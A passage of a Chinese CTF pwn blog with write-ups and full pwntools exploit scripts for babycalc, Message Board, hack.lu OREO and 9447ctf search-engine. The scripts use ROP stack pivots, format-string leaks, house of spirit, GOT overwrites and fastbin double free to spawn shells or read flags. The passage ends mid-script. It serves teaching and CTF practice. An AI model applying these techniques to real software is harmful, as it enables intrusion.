class="hljs-number">0x4A5D</span>)<br>solver.add(v9 * v8 * v7 + v10 == <span class="hljs-number">0xF1AF</span>)<br>solver.add((v8 * v7 - v9) * v10 == <span class="hljs-number">0x8E03D</span>)<br>solver.add(v11 == <span class="hljs-number">0x32</span>)<br>solver.add((v9 + v8 * v7) * v10 == <span class="hljs-number">0x8F59F</span>)<br>solver.add(v13 * v12 * v11 - v14 == <span class="hljs-number">0x152FD3</span>)<br>solver.add(v13 * v12 * v11 + v14 == <span class="hljs-number">0x15309D</span>)<br>solver.add((v12 * v11 - v13) * v14 == <span class="hljs-number">0x9C48A</span>)<br>solver.add((v11 * v5 - v16) * v12 == <span class="hljs-number">0x4E639</span>)<br>solver.add((v13 + v12 * v11) * v14 == <span class="hljs-number">0xA6BD2</span>)<br>solver.add(v17 * v16 * v15 - v18 == <span class="hljs-number">0x8996D</span>)<br>solver.add(v17 * v16 * v15 + v18 == <span class="hljs-number">0x89973</span>)<br>solver.add(v14 == <span class="hljs-number">0x65</span>)<br>solver.add((v16 * v15 - v17) * v18 == <span class="hljs-number">0x112E6</span>)<br>solver.add((v17 + v16 * v15) * v18 == <span class="hljs-number">0x11376</span>)<br><span class="hljs-built_in">print</span>(solver.check())<br><span class="hljs-built_in">print</span>(solver.model())<br></code></pre></td></tr></table></figure><p>方程组解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[v3 = <span class="hljs-number">19</span>,v11 = <span class="hljs-number">50</span>,v14 = <span class="hljs-number">101</span>,v13 = <span class="hljs-number">212</span>,v16 = <span class="hljs-number">199</span>,v6 = <span class="hljs-number">70</span>,v4 = <span class="hljs-number">36</span>,v5 = <span class="hljs-number">53</span>,v9 = <span class="hljs-number">17</span>,v17 = <span class="hljs-number">24</span>,v15 = <span class="hljs-number">118</span>,v18 = <span class="hljs-number">3</span>,v7 = <span class="hljs-number">55</span>,v12 = <span class="hljs-number">131</span>,v10 = <span class="hljs-number">161</span>,v8 = <span class="hljs-number">66</span>]<br></code></pre></td></tr></table></figure><img src="/2023/02/03/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-wp/input.png" class title="input"><p>利用重点之数值输入部分：</p><ul><li>向buf[208]写入0x100字节且在输入最后补空字节</li><li>由i控制输入数值写的位置</li><li>每个数字占一字节</li></ul><p>buf存在溢出，i可控，当输入0x100时能溢出一个空字节到rbp</p><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><p>这道题的利用点主要有两个：</p><ul><li>buf溢出控制i能实现向前写无数字节或向后写一字节</li><li>向buf输入0x100字节时能实现of by null将rbp的最低位置零</li></ul><p>在最开始做的时候我有想到of by null将rbp最低位置零会是一个利用点，但因为栈地址未知所以把这个想法否了。后来因为想不到控制i怎么利用又找回了这个想法，进一步想到利用栈迁移有几率让rsp落在buf内，但由于本人对爆破有偏见所以又将这个想法搁置了(╯▔皿▔)╯。后来实在没法推进跟学长说了这个想法才发现思想有问题(╯‵□′)╯︵┻━┻，记录一下学长的至理名言警醒自己o(TヘTo)</p><img src="/2023/02/03/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-wp/aaaa.png" class title="aaaa"> <p>最后推进这个想法证明可行（浪费好多时间越想越气╰（‵□′）╯）</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ul><li>第一次栈迁移泄露libc基址然后返回0x400c1b（需要有正常的rbp所以不能直接返回cal，返回0x400c1a会导致后面的printf无法正常执行不知道为啥）</li><li>第二次栈迁移执行system(‘&#x2F;bin&#x2F;sh’)</li></ul><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import *</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p=remote(<span class="hljs-string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="hljs-number">24101</span>)<br><span class="hljs-comment">#p=process(&#x27;./babycalc&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./babycalc&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>v=[<span class="hljs-number">19</span>,<span class="hljs-number">36</span>,<span class="hljs-number">53</span>,<span class="hljs-number">70</span>,<span class="hljs-number">55</span>,<span class="hljs-number">66</span>,<span class="hljs-number">17</span>,<span class="hljs-number">161</span>,<span class="hljs-number">50</span>,<span class="hljs-number">131</span>,<span class="hljs-number">212</span>,<span class="hljs-number">101</span>,<span class="hljs-number">118</span>,<span class="hljs-number">199</span>,<span class="hljs-number">24</span>,<span class="hljs-number">3</span>]<br>s=<span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> v:<br>    s+=i.to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br><span class="hljs-built_in">print</span>(s)<br>ret_addr=<span class="hljs-number">0x400c19</span><br>pop_rdi=<span class="hljs-number">0x400ca3</span><br>payload=<span class="hljs-string">b&#x27;24&#x27;</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">6</span>+p64(ret_addr)*<span class="hljs-number">21</span>+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(<span class="hljs-number">0x400c1b</span>)+s+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">28</span>+<span class="hljs-string">b&#x27;\x38&#x27;</span>+<span class="hljs-string">b&#x27;\x00\x00\x00&#x27;</span><br>p.sendafter(<span class="hljs-string">b&#x27;number-1:&#x27;</span>,payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;good done\n&#x27;</span>)<br><br><span class="hljs-comment">#leak libc</span><br>x=p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>puts_addr=u64(x)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(u64(x)))<br><span class="hljs-comment">#libc=LibcSearcher(&quot;puts&quot;,puts_addr)</span><br>libcbase=u64(x)-<span class="hljs-number">0x06f6a0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><br><span class="hljs-comment">#system(&#x27;/bin/sh&#x27;)</span><br>system_addr=libcbase+<span class="hljs-number">0x0453a0</span><br>bin_sh_addr=libcbase+<span class="hljs-number">0x18ce57</span><br>shellcode=<span class="hljs-string">b&#x27;24&#x27;</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">6</span>+p64(ret_addr)*<span class="hljs-number">22</span>+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)+s+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">28</span>+<span class="hljs-string">b&#x27;\x38&#x27;</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">3</span><br>p.send(shellcode)<br><span class="hljs-comment">#p.recvuntil(b&#x27;good done\n&#x27;)</span><br>p.interactive()<br><span class="hljs-comment">#pause()</span><br></code></pre></td></tr></table></figure><h3 id="Message-Board"><a href="#Message-Board" class="headerlink" title="Message Board"></a>Message Board</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>开了沙箱，一个格式化字符串漏洞用于泄露libc基址和栈地址，0x10的溢出栈迁移到v7内布置的rop链进行orw。没啥难的不说了</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p=remote(<span class="hljs-string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="hljs-number">21495</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Welcome to DASCTF message board, please leave your name:&#x27;</span>,<span class="hljs-string">b&#x27;%p,%31$p&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Hello, &#x27;</span>)<br>s1=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;,&#x27;</span>)[:-<span class="hljs-number">1</span>].decode(),<span class="hljs-number">16</span>)<br>s2=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;Hello&#x27;</span>)[:-<span class="hljs-number">5</span>].decode(),<span class="hljs-number">16</span>)<br>v7=s1+<span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(v7))<br>libcbase=s2-<span class="hljs-number">0xc1083</span>+<span class="hljs-number">0x9d000</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>open_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>bss=<span class="hljs-number">0x4040b0</span><br>pop_rdi_addr=<span class="hljs-number">0x401413</span><br>pop_rsi_addr=<span class="hljs-number">0x2601f</span>+libcbase<br>pop_rdx_addr=<span class="hljs-number">0x142c92</span>+libcbase<br>payload=<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span>+p64(pop_rdi_addr)+p64(v7)+p64(pop_rsi_addr)+p64(<span class="hljs-number">0</span>)+p64(open_addr)<br>payload+=p64(pop_rdi_addr)+p64(<span class="hljs-number">3</span>)+p64(pop_rsi_addr)+p64(bss)+p64(pop_rdx_addr)+p64(<span class="hljs-number">0x40</span>)+p64(read_addr)<br>payload+=p64(pop_rdi_addr)+p64(<span class="hljs-number">1</span>)+p64(pop_rsi_addr)+p64(bss)+p64(pop_rdx_addr)+p64(<span class="hljs-number">0x40</span>)+p64(write_addr)<br>payload+=<span class="hljs-string">b&#x27;Q&#x27;</span>*<span class="hljs-number">16</span><br>payload+=p64(v7)+p64(<span class="hljs-number">0x4013a2</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Now, please say something to DASCTF:\n&#x27;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2014 hack.lu CTF OREO</title>
    <link href="/2023/02/02/hack-lu-CTF-2014-OREO/"/>
    <url>/2023/02/02/hack-lu-CTF-2014-OREO/</url>
    
    <content type="html"><![CDATA[<p>house of spirit就不写了没啥写的，所有的检查fastbin dup里都有提。这题写的也没有那么折磨( •̀ ω •́ )y</p><span id="more"></span><h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><img src="/2023/02/02/hack-lu-CTF-2014-OREO/main.png" class title="main"><p>注意一点，notice里存的是notice_context的地址，上面的是malloc的chunk的数量cnt和free的chunk的数量cnt_del，这一块之后将用于伪造fake chunk</p><img src="/2023/02/02/hack-lu-CTF-2014-OREO/notice.png" class title="notice"><h2 id="main-和read-num"><a href="#main-和read-num" class="headerlink" title="main_和read_num"></a>main_和read_num</h2><p>真正的主函数，没啥好说的</p><img src="/2023/02/02/hack-lu-CTF-2014-OREO/main_.png" class title="main_"><p>读入一个数</p><img src="/2023/02/02/hack-lu-CTF-2014-OREO/read_num.png" class title="read_num"><p>这道题很奇怪的一点就是exp中gdb.attach后收不到”Action: “，原因未知。总之交互很奇怪</p><h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><p>可以通过溢出改变chunk链。会递增cnt</p><img src="/2023/02/02/hack-lu-CTF-2014-OREO/add.png" class title="add"><h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><p>输出所有chunk</p><img src="/2023/02/02/hack-lu-CTF-2014-OREO/show.png" class title="show"><h2 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h2><p>删除所有chunk，递增cnt_del，无uaf</p><img src="/2023/02/02/hack-lu-CTF-2014-OREO/delete.png" class title="delete"><h2 id="message"><a href="#message" class="headerlink" title="message"></a>message</h2><p>留言在notice所指向的地址</p><img src="/2023/02/02/hack-lu-CTF-2014-OREO/message.png" class title="message"><h2 id="stats"><a href="#stats" class="headerlink" title="stats"></a>stats</h2><p>输出cnt、cnt_del和notice，没啥用</p><img src="/2023/02/02/hack-lu-CTF-2014-OREO/stats.png" class title="stats"><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ul><li><p>先add一个chunk，溢出到最后四字节改指针指向puts的got表然后show泄露libc基址</p></li><li><p>可以在cnt和notice这块伪造fake chunk，把cnt当作size。由于chunk申请的大小是0x40，所以我们要再申请0x40个chunk（之前已经有一个了），并且最后一个chunk的最后四字节要指向0x804a28</p><img src="/2023/02/02/hack-lu-CTF-2014-OREO/notice.png" class title="notice"></li><li><p>message留言fake chunk的后半部分。chunk的最后四字节置0，nextchunk的size和presize布置为合法值</p></li><li><p>delete，fake chunk进入fastbin且为第一个chunk</p></li><li><p>add回fake chunk，将notice覆盖为elf.got[‘strlen’]-0x8</p></li><li><p>再message，写</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">b<span class="hljs-number">&#x27;</span>/bin/sh\x00<span class="hljs-number">&#x27;</span>+p32(system_addr)<br></code></pre></td></tr></table></figure><p>这时内存就是这样的</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">notice-&gt; elf.got[<span class="hljs-string">&#x27;strlen&#x27;</span>]<span class="hljs-number">-0x8</span>-&gt; b<span class="hljs-number">&#x27;</span>/bin/sh\x00<span class="hljs-number">&#x27;</span><br>   elf.got[<span class="hljs-string">&#x27;strlen&#x27;</span>]-&gt; system_addr <br></code></pre></td></tr></table></figure><ul><li>之后replace_enter_0中会执行strlen(notice)，这时候实际执行的就是system(‘&#x2F;bin&#x2F;sh’)<img src="/2023/02/02/hack-lu-CTF-2014-OREO/replace_enter_0.png" class title="replace_enter_0"></li></ul><h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">description,name</span>):<br>    p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendline(name)<br>    p.sendline(description)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>():<br>    p.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">message</span>(<span class="hljs-params">notice</span>):<br>    p.sendline(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendline(notice)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stats</span>():<br>    p.sendline(<span class="hljs-string">b&#x27;5&#x27;</span>)<br><br>p=process(<span class="hljs-string">&#x27;./oreo&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./oreo&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;Q&#x27;</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>*<span class="hljs-number">0x1b</span>+p32(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>show()<br>p.recvuntil(<span class="hljs-string">b&#x27;Name: \nDescription: &#x27;</span>)<br>s=p.recv()[:<span class="hljs-number">4</span>]<br>libcbase=u32(s)-libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x3f</span>):<br>    add(<span class="hljs-string">b&#x27;Q&#x27;</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;Q&#x27;</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>*<span class="hljs-number">0x1b</span>+p32(<span class="hljs-number">0x804a2a8</span>))<br>message(<span class="hljs-string">b&#x27;Q&#x27;</span>*(<span class="hljs-number">0x38</span>-<span class="hljs-number">0x18</span>-<span class="hljs-number">4</span>)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0x40</span>)+p32(<span class="hljs-number">0x21</span>))<br>delete()<br>system_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(p32(<span class="hljs-number">0x804a250</span>-<span class="hljs-number">8</span>),<span class="hljs-string">b&#x27;a&#x27;</span>)<br>gdb.attach(p)<br>pause()<br>message(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p32(system_addr))<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>house of spirit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2015 9447ctf search-engine</title>
    <link href="/2023/01/31/2015-9447ctf-search-engine/"/>
    <url>/2023/01/31/2015-9447ctf-search-engine/</url>
    
    <content type="html"><![CDATA[<p>两种做法，打栈或者malloc_hook。fastbin_dup_into_stack只是fake chunk在栈上没啥好写的就不写专门的博客了<br>感想：好坐牢好坐牢这道题真的做的好坐牢(╯‵□′)╯︵┻━┻！！！静态分析还是不行呜呜呜</p><span id="more"></span><h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><p>主要两个功能函数，一个输入sentence提取其中的word加入链表（2-index），另一个查找单词（1-search）</p><img src="/2023/01/31/2015-9447ctf-search-engine/main.png" class title="main"><img src="/2023/01/31/2015-9447ctf-search-engine/menu.png" class title="menu"><p>主要分析四个函数，index和search两个功能函数，read_num读取操作数的函数（fastbin_dup_into_stack用），read_enter读入内容</p><h2 id="read-enter"><a href="#read-enter" class="headerlink" title="read_enter"></a>read_enter</h2><p>三个参数a1，a2，a3：</p><ul><li>a1是字符写入的地址</li><li>a2是读入字节个数</li><li>a3是一个选项。a3&#x3D;&#x3D;1时表示遇到’\n’时读入终止并将’\n’换成空字符，a3&#x3D;&#x3D;0时直到读入a2字节程序终止，没有结束符<img src="/2023/01/31/2015-9447ctf-search-engine/read_enter.png" class title="read_enter"></li></ul><h2 id="read-num"><a href="#read-num" class="headerlink" title="read_num"></a>read_num</h2><ul><li>read_enter读入48字节，允许’\n’提前终止读入</li><li>nptr转换为数字，如果输入非数字会输出输入内容，递归执行read_num<img src="/2023/01/31/2015-9447ctf-search-engine/read_num.png" class title="read_num"></li></ul><h2 id="index"><a href="#index" class="headerlink" title="index"></a>index</h2><ul><li>malloc一个sentence chunk，读入句子（固定长度读入且无结束符）并初始化一些变量<img src="/2023/01/31/2015-9447ctf-search-engine/index1.png" class title="index1"></li><li>初始化第一个word chunk。word chunk存五个地址：word的地址（指向sentence chunk内）、word的长度、sentence的地址，sentence的长度、下一个word chunk的地址<img src="/2023/01/31/2015-9447ctf-search-engine/index2.png" class title="index2"></li><li>分词，将word链入链表<img src="/2023/01/31/2015-9447ctf-search-engine/index3.png" class title="index3"></li></ul><h2 id="search"><a href="#search" class="headerlink" title="search"></a>search</h2><p>流程不难，就是要注意第17行的判断（静态分析的时候没注意导致坐牢巨久）</p><img src="/2023/01/31/2015-9447ctf-search-engine/search.png" class title="search"><h1 id="两种方法"><a href="#两种方法" class="headerlink" title="两种方法"></a>两种方法</h1><h2 id="打malloc-hook"><a href="#打malloc-hook" class="headerlink" title="打malloc_hook"></a>打malloc_hook</h2><h3 id="泄露libc基址"><a href="#泄露libc基址" class="headerlink" title="泄露libc基址"></a>泄露libc基址</h3><p>由于search会在删除sentence后清空chunk，所以可以通过search相同size的空字符找到相应的word chunk，实现uaf<br>注意申请chunk的size对齐0x10，不然next chunk的presize会被使用，free进unsorted bin会设置presize造成这部分内容不空，如下图所示</p><img src="/2023/01/31/2015-9447ctf-search-engine/presize.png" class title="presize"><h3 id="制造fastbin-double-free"><a href="#制造fastbin-double-free" class="headerlink" title="制造fastbin double free"></a>制造fastbin double free</h3><p>这道题制造double free的时候不一样的一点是要malloc三个块而不是两个。因为search时会先检测sentence是否为空，而fastbin的最后一个chunk的fd指针（chunk的data段开始）为null那么就相当于sentence为空，遍历链表的时候会跳过。所以第一个free的chunk是没法用的。</p><h3 id="改fd打malloc-hook"><a href="#改fd打malloc-hook" class="headerlink" title="改fd打malloc_hook"></a>改fd打malloc_hook</h3><p>这就没啥了，套路</p><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,sentence</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the sentence size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Enter the sentence:\n&#x27;</span>,sentence)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">size,word,delete</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the word size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Enter the word:\n&#x27;</span>,word)<br>    p.recvuntil(<span class="hljs-string">b&#x27;: &#x27;</span>)<br>    s=p.recvuntil(<span class="hljs-string">b&#x27;Delete&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27; this sentence (y/n)?\n&#x27;</span>,delete)<br>    <span class="hljs-keyword">return</span> s<br><br>p=process(<span class="hljs-string">&#x27;./search&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>libc=ELF(<span class="hljs-string">&#x27;./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&#x27;</span>)<br>add(<span class="hljs-number">0x10a</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span>+<span class="hljs-string">b&#x27; b&#x27;</span>)<br>x=index(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;b&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>x=index(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>,<span class="hljs-string">b&#x27;n&#x27;</span>)<br>libcbase=u64(x[:<span class="hljs-number">8</span>])-libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">0x68</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x5d</span>+<span class="hljs-string">b&#x27; dd&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x5d</span>+<span class="hljs-string">b&#x27; dd&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x5d</span>+<span class="hljs-string">b&#x27; dd&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Enter the word size:\n&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Enter the word:\n&#x27;</span>,<span class="hljs-string">b&#x27;dd&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span 